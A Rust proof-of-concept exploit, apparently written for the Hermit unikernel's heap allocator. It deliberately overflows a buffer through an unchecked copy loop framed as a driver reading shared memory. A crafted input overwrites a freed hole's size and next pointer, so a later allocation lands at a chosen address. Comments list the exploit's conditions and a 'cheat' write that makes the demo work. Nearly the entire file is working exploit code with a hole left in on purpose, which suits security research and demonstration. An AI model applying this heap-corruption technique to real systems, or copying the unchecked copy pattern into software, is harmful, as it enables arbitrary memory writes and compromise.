#[cfg(target_os = "hermit")]
extern crate hermit_sys;

fn print_heap_layout(base: usize) {
    let mut i = 0;
    while i < 0x280 {
        unsafe {
            println!("{:p}: 0x{:x}", (base+i) as *const usize, *((base+i) as *const usize));
        }
        i += 8;
    }
}

fn main() {
    println!("\n--- Welcome aboard our Airbus A 1337! ---\n");
    println!("[info] Main @ {:p}", main as *const ());
    // simulated intput
    // fill legitimate buffer + padding to 128byte
    let input: Vec<u8> = Vec::from([
    // fill legitimate 128 byte buffer
    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
    // overwrite following hole's size
    0x40, 0, 0, 0, 0, 0, 0, 0,
    // overwrite following holes's next pointer with our arbitrary target address
    0x80, 0x43, 0xc0, 0x01, 0, 0, 0, 0
    ]);

    
    // allocate buffers
    let mut buf: Vec<u8> = vec![1; 32];
    let buf2: Vec<u8> = vec![2; 64];
    let _buf3: Vec<u8> = vec![3; 256];
   
    println!("\n heap layout after allocating all buffers");
    print_heap_layout(buf.as_ptr() as usize);
    
    // free buffer2 to have buffer followed by a hole
    drop(buf2); 
    /*
    // Allocate a buffer and write a number inside the former buf2 to check if anything is zeroed
    // on free or allocation
    unsafe {
        *(std::alloc::alloc(std::alloc::Layout::new::<[u8; 64]>()).offset(32)) = 0x42;
    }
    */


    println!("\n heap layout after deallocating buffer2");
    print_heap_layout(buf.as_ptr() as usize);
   

    unsafe {
        // vulnerable copy loop e.g. for a driver copying from shared mmio
        let mut i = 0;
        for elem in input {
            *(buf.as_mut_ptr().offset(i)) = elem; 
            i+=1;
        }
        
        // allocator runs into page fault when fake_hole.next_ptr is not readable or not 0 (end of
        // hole list)
        // also the constraint hole_addr + hole.size <= addr has to be met for the next hole
        // see src/mm/hole.rs#L244
        // Thus, the constraint for this exploit to work is:
        // 1. Target address needs to have a value large enough we get the hole allocated AND
        // 2. Traget address + 8 has to be 0 or a valid readable address matching above condition
        // cheat: set target address + 8 to 0 for this poc
        *(0x1c04388 as *mut u64) = 0;
    }
   

    println!("\n heap layout after cheating");
    print_heap_layout(buf.as_ptr() as usize);

    // allocate buffer which now is allocated at out arbitrary target address
    // write payload there
    let buf4: Vec<u8> = vec![4; 257];


    println!("\n heap layout after exploit");
    print_heap_layout(buf.as_ptr() as usize);
    
    println!("[info] written to {:p}!", buf4.as_ptr()); 
    println!("\n--- Thank you for flying with Expl01t Airlines! ---\n");
}
